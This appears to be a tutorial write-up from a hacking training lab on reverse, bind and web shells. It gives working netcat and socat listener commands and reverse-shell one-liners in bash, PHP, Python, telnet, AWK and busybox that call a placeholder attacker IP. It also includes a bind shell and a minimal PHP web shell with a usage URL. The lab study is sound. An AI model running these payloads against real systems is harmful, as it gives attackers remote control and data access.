# Shells Overview
## Task 1 - Introduction
A **shell** is a critical tool for attackers to **remotely control** a target system. This room focuses on how **shells** work manually, without using automated tools like Metasploit.

### Learning Goals:
* Differences between **Reverse** and **Bind** shells.
* How to set up **listeners** and execute **payloads**.
* How **Web Shells** work on web servers.

---

## Task 2 - Shell Overview
A **shell** is the "middleman" software that lets you talk to the **Operating System**. In hacking, it refers to the session used to run commands on a **victim's machine**.

### Why attackers want a shell:
* **Privilege Escalation:** Moving from a "normal" user to a **root** or **admin** user.
* **Data Exfiltration:** Stealing files and sensitive data.
* **Pivoting:** Using the hacked machine to jump deeper into the internal network.
* **Persistence:** Leaving a **backdoor** so they can come back later.

---

## Task 3 - Reverse Shell
In a **Reverse Shell**, the **target machine** initiates the connection to the **attacker**. This is very popular because it often tricks **firewalls** into thinking it is normal outgoing traffic.


### 1. Setting up the Listener
The **attacker** must be waiting for the connection first. We use **Netcat (nc)** for this:
```bash
nc -lvnp 443
```

* **-l**: Listen mode.
* **-v**: Verbose (tells us what is happening).
* **-n**: No DNS (use IP addresses only).
* **-p**: The port to wait on (e.g., 443).

### 2. The Payload 
The **target** runs a command like this to send the shell:
```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP 443 >/tmp/f
```

* **Explanation:** This creates a **Named Pipe** (/tmp/f). It allows **two-way communication** so you can type commands and see the results back on your screen.

---

## Task 4 - Bind Shell
In a **Bind Shell**, the **target machine** opens a port and waits for the **attacker** to connect. It is less common because **firewalls** usually block random incoming connections.



### 1. Setup on Target:
The **victim machine** runs a command to **bind** the shell to a port:
```bash

rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
```
### 2. Attacker Connection:
The **attacker** connects to that specific port:
```bash
nc -nv TARGET_IP 8080
```
---

## Task 5 - Advanced Shell Listeners
Basic **Netcat** is great, but these tools offer more features:

* **Rlwrap:** Fixes the "broken" terminal feel. It allows you to use **arrow keys** and search through your **command history**.
```bash
rlwrap nc -lvnp 443
```
* **Ncat (SSL):** An Nmap tool that allows for **encrypted shells** so defenders cannot see what you are typing.
```bash
ncat --ssl -lvnp 4444
```
* **Socat:** A powerful tool that creates a link between two data sources (like a port and a shell).
```bash
socat -d -d TCP-LISTEN:443 STDOUT
```
---

## Task 6 - Common Shell Payloads
If one language doesn't work, attackers try others. Here are the most common ways to spawn a **shell**:

### Bash (Classic)
```bash
bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
```

### PHP (Websites)
```bash
php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'
```
### Python (Scripts)
```bash

python -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
```
### Telnet (Old systems)
```bash
TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP 443 0<$TF | sh 1>$TF
```
### AWK (Creative)
```bash
awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```
### BusyBox (Small systems)
```bash
busybox nc ATTACKER_IP 443 -e sh
```
---

## Task 7 - Web Shells
A **Web Shell** is a script (**PHP**, **ASP**, or **JSP**) uploaded to a server. It runs commands through the **web browser** instead of a terminal.


### Code
```bash
<?php if (isset($_GET['cmd'])) { system($_GET['cmd']); } ?>
```
### How to use it:
If uploaded as **shell.php**, the attacker visits: `http://victim.com/shell.php?cmd=id`
The website runs the command **id** and shows the result on the webpage.

---

## Task 8 - Conclusion
In this room, we learned about:
* **Reverse Shell:** Victim connects to you (Best for bypassing firewalls).
* **Bind Shell:** You connect to victim.
* **Web Shell:** Used through a browser.
